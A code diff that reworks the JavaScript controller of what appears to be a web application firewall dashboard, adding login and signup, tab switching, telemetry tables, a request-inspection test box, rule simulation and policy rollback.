-      <div>Designed for Reliability // Architect: Anup Dhokiya (@anup-dhokiya)</div>
-    </footer>
-
-  </div>
-
-  <!-- Interactive JavaScript Controller -->
+  <!-- Interactive Modular JavaScript Controller -->
   <script>
     const API = "/v1";
 
-    async function refreshConsole() {
+    function switchTab(tabId) {
+      document.querySelectorAll(".view-section").forEach(el => el.classList.remove("active"));
+      document.querySelectorAll(".nav-item").forEach(el => el.classList.remove("active"));
+
+      const target = document.getElementById("view-" + tabId);
+      if (target) target.classList.add("active");
+
+      // Set active nav tab
+      const navItems = Array.from(document.querySelectorAll(".nav-item"));
+      const match = navItems.find(el => el.getAttribute("onclick")?.includes(tabId));
+      if (match) match.classList.add("active");
+
+      if (tabId === "dashboard") refreshDashboard();
+      if (tabId === "inventory") loadEndpoints();
+    }
+
+    function toggleAuthMode(mode) {
+      if (mode === 'signup') {
+        document.getElementById('login-form-box').style.display = 'none';
+        document.getElementById('signup-form-box').style.display = 'block';
+      } else {
+        document.getElementById('login-form-box').style.display = 'block';
+        document.getElementById('signup-form-box').style.display = 'none';
+      }
+    }
+
+    async function handleLogin() {
+      const email = document.getElementById("auth-email").value;
+      const pwd = document.getElementById("auth-password").value;
+
+      try {
+        const res = await fetch(`${API}/auth/login`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email: email, password: pwd })
+        });
+        const data = await res.json();
+        if (res.ok) {
+          alert(`Welcome back, ${data.user.full_name}!`);
+          document.getElementById("user-display-name").innerText = data.user.full_name;
+          document.getElementById("user-display-role").innerText = data.user.role.toUpperCase();
+          switchTab("dashboard");
+        } else {
+          alert("Login error: " + data.detail);
+        }
+      } catch (e) {
+        alert("Authentication failed: " + e);
+      }
+    }
+
+    async function handleSignup() {
+      const name = document.getElementById("signup-name").value;
+      const email = document.getElementById("signup-email").value;
+      const pwd = document.getElementById("signup-password").value;
+
+      try {
+        const res = await fetch(`${API}/auth/signup`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ full_name: name, email: email, password: pwd })
+        });
+        const data = await res.json();
+        if (res.ok) {
+          alert(`Account created successfully for ${data.user.full_name}!`);
+          document.getElementById("user-display-name").innerText = data.user.full_name;
+          document.getElementById("user-display-role").innerText = "ANALYST";
+          switchTab("dashboard");
+        } else {
+          alert("Registration error: " + data.detail);
+        }
+      } catch (e) {
+        alert("Registration failed: " + e);
+      }
+    }
+
+    async function refreshDashboard() {
       try {
         const res = await fetch(`${API}/overview`);
         const data = await res.json();
-
-        // Update KPIs
         document.getElementById("kpi-endpoints").innerText = data.endpoints_count;
-        document.getElementById("kpi-websites").innerText = `Across ${data.websites_count} Websites`;
+        document.getElementById("kpi-websites").innerText = `Across ${data.websites_count} Domains`;
         document.getElementById("kpi-shadow").innerText = data.shadow_endpoints_count;
         document.getElementById("kpi-blocked").innerText = data.blocked_events;
         document.getElementById("kpi-blockrate").innerText = `${data.block_rate_percent}%`;
 
-        // Render Telemetry
         const tbody = document.getElementById("telemetry-body");
         if (data.recent_events && data.recent_events.length > 0) {
           tbody.innerHTML = data.recent_events.map(ev => {
             let badge = `<span class="badge badge-allow">ALLOW</span>`;
             if (ev.action === "BLOCK") badge = `<span class="badge badge-block">BLOCK (403)</span>`;
             if (ev.action === "CHALLENGE") badge = `<span class="badge badge-challenge">CHALLENGE</span>`;
-
             return `
               <tr>
-                <td style="font-family: var(--font-mono); color: var(--text-muted);">${ev.timestamp.substring(11, 19)}</td>
+                <td style="font-family: var(--font-mono); color: var(--text-muted);">${ev.timestamp.substring(11, 19)} UTC</td>
                 <td style="font-family: var(--font-mono); font-weight: 600;">${ev.client_ip}</td>
                 <td><strong style="color: var(--deep-indigo);">${ev.method}</strong> <code>${ev.path}</code></td>
                 <td><strong>${ev.risk_score}</strong>/100</td>
                 <td>${badge}</td>
-                <td style="color: ${ev.action === 'BLOCK' ? 'var(--terracotta)' : 'inherit'}; font-weight: 600;">
-                  ${ev.rule_triggered || 'Clean'}
-                </td>
+                <td style="color: ${ev.action === 'BLOCK' ? 'var(--terracotta)' : 'inherit'}; font-weight: 600;">${ev.rule_triggered || 'Clean'}</td>
               </tr>
             `;
           }).join("");
         }
       } catch (e) {
-        console.error("Telemetry fetch error:", e);
+        console.error("Dashboard refresh error:", e);
       }
     }
 
@@ -660,13 +663,11 @@
         const res = await fetch(`${API}/endpoints`);
         const list = await res.json();
         const tbody = document.getElementById("endpoints-body");
-
         if (list && list.length > 0) {
           tbody.innerHTML = list.map(ep => {
             let badge = `<span class="badge badge-allow">DOCUMENTED</span>`;
             if (ep.status === "shadow") badge = `<span class="badge badge-shadow">SHADOW</span>`;
             if (ep.status === "zombie") badge = `<span class="badge badge-challenge">ZOMBIE</span>`;
-
             return `
               <tr>
                 <td>${badge}</td>
@@ -691,8 +692,8 @@
       const ua = document.getElementById("attack-ua").value;
       const box = document.getElementById("attack-output");
 
-      box.classList.add("active");
-      box.innerHTML = `Evaluating request through sub-5ms inspection engine...`;
+      box.style.display = "block";
+      box.innerHTML = "Evaluating through Security Brain...";
 
       try {
         const res = await fetch(`${API}/inspect`, {
@@ -707,50 +708,44 @@
             client_ip: "198.51.100.88"
           })
         });
-
-        const data = await res.json();
+        const d = await res.json();
         box.innerHTML = `
-<strong>Decision:</strong> <span style="color: ${data.action === 'BLOCK' ? 'var(--terracotta)' : 'var(--sage-green)'}; font-weight: 700;">${data.action}</span><br>
-<strong>Risk Score:</strong> ${data.risk_score} / 100<br>
-<strong>Rule Triggered:</strong> ${data.rule_triggered}<br>
-<strong>OWASP Category:</strong> ${data.owasp_category}<br>
-<strong>Execution Latency:</strong> ${data.execution_latency_ms} ms
+          <strong>Verdict:</strong> <span style="color: ${d.action === 'BLOCK' ? 'var(--terracotta)' : 'var(--sage-green)'}; font-weight: 800;">${d.action} (HTTP ${d.action === 'BLOCK' ? '403' : '200'})</span><br>
+          <strong>Risk Score:</strong> ${d.risk_score} / 100<br>
+          <strong>Signature Matched:</strong> ${d.rule_triggered}<br>
+          <strong>OWASP / CVE Reference:</strong> ${d.owasp_category} ${d.cve_reference ? '(' + d.cve_reference + ')' : ''}<br>
+          <strong>Latency:</strong> ${d.execution_latency_ms} ms
         `;
-        refreshConsole();
+        refreshDashboard();
       } catch (e) {
-        box.innerHTML = `Inspection error: ${e}`;
+        box.innerHTML = "Inspection failed: " + e;
       }
     }
 
     async function runSimulation() {
-      const ruleId = document.getElementById("rule-id").value;
-      const ua = document.getElementById("rule-ua").value;
+      const ruleId = document.getElementById("sim-rule-id").value;
+      const ua = document.getElementById("sim-rule-ua").value;
       const box = document.getElementById("sim-output");
 
-      box.classList.add("active");
-      box.innerHTML = `Simulating candidate rule against historical traffic...`;
+      box.style.display = "block";
+      box.innerHTML = "Replaying historical traffic corpus...";
 
       try {
         const res = await fetch(`${API}/simulate-rule`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            website_id: "site-1",
-            rule_name: ruleId,
-            criteria_ua: ua
-          })
+          body: JSON.stringify({ website_id: "site-1", rule_name: ruleId, criteria_ua: ua })
         });
-
         const rep = await res.json();
         box.innerHTML = `
-<strong>Replay Time:</strong> ${rep.evaluation_duration_ms} ms (${rep.total_evaluated_requests} requests evaluated)<br>
-<strong>Projected Blocks:</strong> ${rep.projected_blocks} | <strong>Newly Blocked:</strong> ${rep.newly_blocked_count}<br>
-<strong>False Positives:</strong> <span style="color: ${rep.potential_false_positive_count > 0 ? 'var(--terracotta)' : 'var(--sage-green)'}; font-weight: 700;">${rep.potential_false_positive_count} (${rep.false_positive_rate_percent}%)</span><br>
-<strong>Status:</strong> ${rep.is_safe_to_deploy ? '✅ Safe to Deploy' : '⚠️ Manual Review Required'}<br>
-${rep.high_risk_false_positive_details.length > 0 ? '<small style="color: var(--terracotta);">' + rep.high_risk_false_positive_details[0].reason + '</small>' : ''}
+          <strong>Replayed Requests:</strong> ${rep.total_evaluated_requests} in ${rep.evaluation_duration_ms} ms<br>
+          <strong>Projected Blocks:</strong> ${rep.projected_blocks} | <strong>Newly Blocked:</strong> ${rep.newly_blocked_count}<br>
+          <strong>False Positives:</strong> <span style="color: ${rep.potential_false_positive_count > 0 ? 'var(--terracotta)' : 'var(--sage-green)'}; font-weight: 700;">${rep.potential_false_positive_count} (${rep.false_positive_rate_percent}%)</span><br>
+          <strong>Deployment Status:</strong> ${rep.is_safe_to_deploy ? '✅ Safe to Deploy' : '⚠️ Manual Review Required'}<br>
+          ${rep.high_risk_false_positive_details.length > 0 ? '<small style="color: var(--terracotta);">' + rep.high_risk_false_positive_details[0].reason + '</small>' : ''}
         `;
       } catch (e) {
-        box.innerHTML = `Simulation error: ${e}`;
+        box.innerHTML = "Simulation error: " + e;
       }
     }
 
@@ -763,15 +758,14 @@ ${rep.high_risk_false_positive_details.length > 0 ? '<small style="color: var(--
           body: JSON.stringify({ website_id: "site-1", target_version: 1 })
         });
         const d = await res.json();
-        alert(`Rollback completed: Restored to policy v${d.policy.version} with fresh Ed25519 signature.`);
+        alert(`Rollback successful! Restored to policy v${d.policy.version} with fresh Ed25519 signature.`);
       } catch (e) {
-        alert("Rollback error: " + e);
+        alert("Rollback failed: " + e);
       }
     }
 
-    // Auto-boot
-    refreshConsole();
-    loadEndpoints();
+    // Initialize
+    refreshDashboard();
   </script>
 </body>
 </html>
